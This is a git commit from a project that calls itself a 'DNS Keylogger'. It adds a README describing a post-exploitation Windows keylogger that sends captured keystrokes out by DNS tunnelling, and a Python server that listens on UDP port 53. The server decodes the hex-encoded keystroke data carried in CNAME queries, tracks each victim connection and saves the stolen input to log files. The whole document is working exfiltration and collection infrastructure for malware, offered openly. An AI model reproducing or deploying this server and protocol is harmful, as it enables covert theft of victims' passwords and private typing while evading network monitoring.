16ab4250c1567bb5c37e707500d158cc81491ddf
Geeoon Chung <geeoon13@gmail.com>
2024-01-15 18:01:34 -0800

    Basic server

--- README.md
+++ README.md
@@ -1,4 +1,27 @@
 # DNS Keylogger
-This keylogger will automatically report a computer's keystrokes without admin permissions.
+This post-exploitation keylogger will automatically report a Windows computer's keystrokes without admin permissions. It cannot bypass the UAC
 
-This takes advantage of DNS exflitration, and requires a custom NS server to be discreet.
+This takes advantage of DNS tunelling/exfiltration.
+
+# Protocol
+## A Record Request
+A record requests indicate the start of a "connection." When the server receives them, it will respond with a fake non-reserved IP address where the last octet contains the id of the client.
+
+Concurrent connections cannot exceed 254, and clients are never considered "disconnected."
+## CNAME Record Request
+CNAME record requests indicate actual data being sent to the server.
+It is in the format of `[packet #].[id].[data].[sld].[tld].`
+
+`id` is the id that was established on connection. Data is sent as ASCII data in hex.
+## Malformed Record Requests
+If the client sends an malformed record request, the server will respond with NXDOMAIN.
+## Non-Existant Connections
+If the client sends a data packet with an id greater than the # of connections, the server will respond with REFUSED.
+## Dropped Packets
+Clients should rely on responses as acknowledgements of received packets. If they do not receive a response, resend the same payload.
+## Out of Order Packets
+Occurs when client sends a packet with packet_id that doesn't match what is expected. The server responds with REFUSED.
+
+# Server
+## Listens on UDP port 53 for DNS packets
+Looks for A record and CNAME record requests. Once an A record has been received, the rest of the data from the client should be CNAME record requests.
---
+++ server/main.py
@@ -0,0 +1,198 @@
+from enum import Enum
+import math
+import os
+from random import choice
+import base64
+import socket
+import time
+import dnslib as dns
+
+class PacketTypes(Enum):
+    START = 1  # A Record
+    DATA = 5  # CNAME Record
+
+class DNSSyntaxException(Exception):
+    pass
+
+class ServerMaxConnectionsException(Exception):
+    pass
+
+class NXConnectionException(Exception):
+    pass
+
+class PacketsOutOfOrderException(Exception):
+    pass
+
+# A means of concatonating data and displaying it.
+class DataParser():
+    def __init__(self):
+        self.last_received = -1
+        self.data = bytearray()
+
+    # get number of pushes
+    def get_length(self):
+        return len(self.data)
+    
+    # add data
+    # raises PacketsOutOfOrderException if packet received is in wrong order
+    def add(self, packet_number: int, data: bytes):
+        if not (packet_number > self.last_received or packet_number == 0):
+            self.last_received = 0
+            raise PacketsOutOfOrderException()
+        try:
+            data.decode('ascii')
+            self.data.extend(data)
+        except:
+            print("Unable decode last data packet: " + str(data))
+        finally:
+            self.last_received = packet_number
+
+    # parse the last received bytes
+    def parse_last(self):
+        return self.data[-1].decode('ascii')
+    
+    def parse_all(self):
+        return self.data.decode('ascii')
+    
+    def save_to_disk(self, path: str, id: int):
+        file = open(f'{path}/{int(time.time())}-{id}.log', 'x', encoding='ascii')
+        file.write(self.data.decode('ascii'))
+
+# Manage all of the data parsers, feed it the raw data that comes before the sld.
+# Raises a DNSSyntaxException if the data is not correctly formatted.
+# Raises a NXConnectionException if the data is properly formatted, but the connection doesn't exist.
+class DataParserManager():
+    def __init__(self):
+        self.parsers = []  # DataParser array
+
+    def add_parser(self, parser: DataParser):
+        self.parsers.append(parser)
+
+    def parse(self, data: str):
+        if data.count('.') != 2:
+            raise DNSSyntaxException()
+        
+        connection_id = int(data[data.index('.') + 1:data.rindex('.')])
+        if connection_id > len(self.parsers):
+            raise NXConnectionException()
+        
+        hex = data[data.rindex('.') + 1:]
+        if len(hex) % 2 == 1:
+            raise DNSSyntaxException()
+        packet_number = int(data[:data.index('.')])
+        parser: DataParser = self.parsers[connection_id - 1]
+        parser.add(packet_number, bytes.fromhex(hex))
+
+    def number_of_connections(self):
+        return len(self.parsers)
+    
+    def save_parsers(self, save_path: str):
+        os.makedirs(save_path, exist_ok=True)
+        for i in range(len(self.parsers)):
+            parser: DataParser = self.parsers[i]
+            parser.save_to_disk(save_path, i + 1)
+
+
+def nx_response(request: dns.DNSRecord):
+    answer = request.reply()
+    answer.header.rcode = dns.RCODE.NXDOMAIN
+    return answer
+
+# send reconnect request
+def reconn_response(request: dns.DNSRecord):
+    answer = request.reply()
+    answer.header.rcode = dns.RCODE.REFUSED
+    return answer
+
+def create_fake_ip(connections: int):  # generates a fake ip address that isn't reserved.
+    if connections > 254:
+        raise ServerMaxConnectionsException()
+    fake = ""
+    fake += str(choice([i for i in range(1, 254) if i not in [0, 10, 100, 127, 169, 172, 192, 198, 203, 224, 233, 250, 255]]))
+    for i in range(2):
+        fake += "." + str(choice(range(256)))
+    fake += "." + str(connections + 1)
+    return fake
+
+def index_of_2nd(string: str, sub: str):
+    index = 0
+    last = 0
+    for i in range(len(string)):
+        if string[i] == sub:
+            index = last
+            last = i
+    return index
+
+def get_domain_from_full(full: str):
+    stripped = full.rstrip('.')  # remove trailing dot if exists
+    index = index_of_2nd(stripped, '.')
+    return full[index + int(index != 0):]
+    
+def get_data(full: str):
+    if full.count('.') <= 2:
+        raise DNSSyntaxException()
+    stripped = full.rstrip('.')  # remove trailing dot if exists
+    return full[:index_of_2nd(stripped, '.')]
+
+SAVE_PATH = "./logs"
+# listen on UDP port 53, the default DNS port
+data_parsers = DataParserManager()
+
+udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+udp_socket.bind(('', 53))
+
+print("Listening for traffic...")
+
+try:
+    while True:
+        # wait for an incoming packet
+        data, addr = udp_socket.recvfrom(1024)  # 1024 so packets don't get dropped, but max size shouldn't be above 255
+        print("Received packet from " + addr[0] + "#" + str(addr[1]))
+        request = dns.DNSRecord.parse(data)
+        
+        try:
+            if not request.q.qtype in PacketTypes._value2member_map_:
+                raise DNSSyntaxException()
+            
+            response = request.reply()
+            if request.q.qtype == PacketTypes.START.value:
+                # read data from packet
+                data = get_data(str(request.q.qname))
+
+                # form response
+                # reply with fake IP address, but last octet is current # of connections, starting at 1
+                response.add_answer(dns.RR(rtype=dns.QTYPE.A, rdata=dns.A(create_fake_ip(data_parsers.number_of_connections())), ttl=60))
+                data_parsers.add_parser(DataParser())
+            elif request.q.qtype == PacketTypes.DATA.value:
+                # read data from packet
+                data = get_data(str(request.q.qname))
+                data_parsers.parse(data)
+
+                # form response
+                domain = get_domain_from_full(str(request.q.qname))
+                response.add_answer(dns.RR(rtype=dns.QTYPE.CNAME, rdata=dns.CNAME(domain), ttl=60))   
+        except DNSSyntaxException as e:
+            print("Improper syntax for DNS packet from " + addr[0] + "#" + str(addr[1]))
+            response = nx_response(request)
+        except ServerMaxConnectionsException as e:
+            print("Server has reached maximum number of concurrent connections from " + addr[0] + "#" + str(addr[1]))
+            response = nx_response(request)
+        except NXConnectionException as e:
+            print("Connection does not exist from " + addr[0] + "#" + str(addr[1]))
+            response = reconn_response(request)
+        except PacketsOutOfOrderException as e:
+            print("Receiving out of order packets from " + addr[0] + "#" + str(addr[1]))
+            respones = reconn_response(request)
+        except Exception as e:
+            print("Exception raised: " + str(e) + "\n from " + addr[0] + "#" + str(addr[1]))
+        finally:
+            # send response
+            udp_socket.sendto(response.pack(), addr)
+except KeyboardInterrupt:
+    print()
+    pass
+finally:
+    print("Shutting down server...")
+    udp_socket.close()
+    data_parsers.save_parsers(SAVE_PATH)
+    print("Goodbye.")
